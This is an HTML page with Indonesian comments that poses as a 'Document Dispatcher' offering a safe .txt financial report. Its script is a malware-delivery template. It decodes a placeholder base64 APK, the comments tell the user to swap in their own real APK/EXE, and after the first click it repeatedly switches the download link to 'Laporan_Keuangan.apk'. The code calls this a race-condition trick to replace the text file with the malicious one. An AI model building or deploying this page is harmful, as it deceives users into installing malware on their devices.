<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document Archive</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: monospace; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
  .panel { background: #111827; padding: 30px; border-radius: 12px; border: 1px solid #1f2937; max-width: 400px; width: 100%; }
  h2 { color: #3b82f6; margin-bottom: 10px; }
  p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px; background: #3b82f6; color: #fff; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #38bdf8; font-size: 13px; }
</style>
</head>
<body>

<div class="panel">
  <h2>📄 Document Dispatcher</h2>
  <p>Mengunduh laporan (.txt) secara aman...</p>
  <button id="startBtn">Download Laporan</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PERSIAPAN PAYLOAD (AMAN & JAHAT)
  // ============================================
  
  // A. File Aman (TXT)
  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware di sini.";
  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
  var safeUrl = URL.createObjectURL(safeBlob);

  // B. File Jahat (APK/EXE Base64)
  // Ganti string ini dengan Base64 file APK/EXE asli Anda.
  var b64Malicious = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  var binary = atob(b64Malicious);
  var bytes = new Uint8Array(binary.length);
  for (var i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  
  // MIME Type APK
  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  var maliciousUrl = URL.createObjectURL(maliciousBlob);

  // ============================================
  // 2. RACE CONDITION (TOCTOU)
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    statusEl.innerText = "Memulai unduhan...";

    // Langkah 1: Buat tag <a>
    var a = document.createElement('a');
    a.style.display = 'none';
    document.body.appendChild(a);

    // Langkah 2: Set ke file AMAN dan ekstensi .txt
    a.href = safeUrl;
    a.download = 'Laporan_Keuangan.txt';
    
    // Langkah 3: Picu Unduhan
    // Browser akan mulai mengunduh file TXT ini.
    a.click();

    // Langkah 4: RACE CONDITION (TOCTOU)
    // Kita ubah atribut secara agresif setelah click().
    // Tujuannya agar proses download yang sedang berjalan
    // tiba-tiba mengarah ke file JAHAT.
    
    var attempts = 0;
    function race() {
      attempts++;
      
      // Ganti ke file JAHAT
      a.href = maliciousUrl;
      a.download = 'Laporan_Keuangan.apk';
      
      // Trigger ulang (bisa memicu unduhan kedua atau mengganti yang pertama)
      a.click();

      if (attempts < 10) {
        // Gunakan setTimeout 0ms untuk menunda eksekusi ke tick berikutnya.
        // Ini memberi waktu browser untuk memproses klik pertama (TXT)
        // sebelum kita memaksa klik kedua (APK).
        setTimeout(race, 0); 
      }
    }
    
    // Mulai race
    race();

    // Cleanup
    setTimeout(function() {
      document.body.removeChild(a);
      URL.revokeObjectURL(safeUrl);
      URL.revokeObjectURL(maliciousUrl);
      statusEl.innerText = "Proses selesai. Cek folder unduhan.";
    }, 5000);
  });

})();
</script>
</body>
</html>
